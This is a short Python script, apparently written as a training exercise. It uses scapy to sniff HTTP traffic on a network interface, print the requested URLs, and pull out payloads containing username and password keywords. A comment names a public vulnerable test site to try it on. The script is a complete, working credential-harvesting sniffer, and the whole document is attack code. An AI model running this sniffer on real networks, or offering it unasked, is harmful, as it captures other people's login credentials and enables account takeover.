#!/usr/bin/env python3

#  test web address to use http://testphp.vulnweb.com/login.php username=test, password=test

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return f"{packet[http.HTTPRequest].Host}{packet[http.HTTPRequest].Path}"


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        try:
            load = packet[scapy.Raw].load.decode()
            keywords = ["uname", "username", "password", "email", "login", "user", "pass", "phone", "passwd"]
            if any(keyword in load for keyword in keywords):
                return load
        except UnicodeDecodeError:
            print("Non-UTF-8 Payload", packet[scapy.Raw].load.hex())
            pass


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url = get_url(packet)
        print(f"[+]  HTTP Request: {url}")

        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n[+] Possible Username & Password Combination: {login_info}\n\n")


def main():
    sniff("eth0")


if __name__ == '__main__':
    main()
